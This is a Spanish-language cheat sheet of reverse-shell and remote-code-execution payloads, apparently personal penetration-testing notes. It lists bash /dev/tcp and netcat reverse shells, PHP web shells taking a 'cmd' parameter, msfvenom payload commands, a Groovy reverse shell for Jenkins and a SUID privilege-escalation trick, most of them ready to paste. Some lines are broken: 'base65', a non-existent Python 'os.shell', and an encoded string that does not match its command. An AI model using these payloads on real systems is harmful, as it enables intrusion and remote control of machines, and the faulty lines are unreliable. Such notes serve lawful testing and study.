# RCE - Reverse Shell

Aquí iremos describiendo las diferentes maneras de crear SHELLs a medida que nos las encontremos.

## LINUX

Diferentes maneras de crear shells en linux.

La manera mas directa de crear una reverse shell en Linux es:

```bash
bash -i >& /dev/tcp/10.10.14.49/443 0>&1
```

Aunque a veces es mejor indicárselo como parámetro:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"
```

En el caso de pasarlo como parámetro en una url hay que "escapar" los & con **%26**.

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.14.49/443 0>%261"
```

Tambien podemos pasar tode en base64. Para generarlo:

```bash
echo "bash -c 'bash -i > /dev/tcp/10.11.16.52/443 0>&1'" | base65
```

Para ejecutarlo:

```bash
echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExLjE2MC80NDQ0IDA+JjEiCg==" | base64 -d | bash
```

Otra manera:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.76.112 443 >/tmp/f
```

## PHP

Ejecución de comandos

```php
<?php system($_REQUEST["cmd"]); ?>
```

Otra manera más bonita:

```php
<?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>
```

Similar a esta:

```php
<?php
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>

```

Directamente la consola:

```php
<?php system("bash -i >& /dev/tcp/192.168.11.160/443 0>&1"); ?>
```

## NETCAT

Con netcat se puede entablar reverse shell:

```bash
nc -e /bin/sh 92.168.11.160 443
```

Ya tambien ponerse a la escucha:

```bash
sudo nc -nlvp 443
```


## Python
Ejemplo para cambiar permisos a SUID.
```python
import os
os.shell("chmod u+s /bin/bash")
# Luego en bash /bin/bash -p
```
## Windows

```
#Con nc
cmd.exe /c "C:\users\joe\documents\nc.exe -e cmd.exe 192.168.11.160 4444"
```

## MSFVENOM
```
# aplicación war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.11.160 LPORT=443 -f war > reverse.war

# Para BufferOverflow
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.196.198 LPORT=443 --platform windows -a x86 -b "\x00" -f c

# Como ejecutable para Windows
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=443 -f exe -o reverse.exe
```

## Groovy - Jenkings

Ejemplo de consola en [[Jenkins]].

```groovy
String host="172.17.0.1";
int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
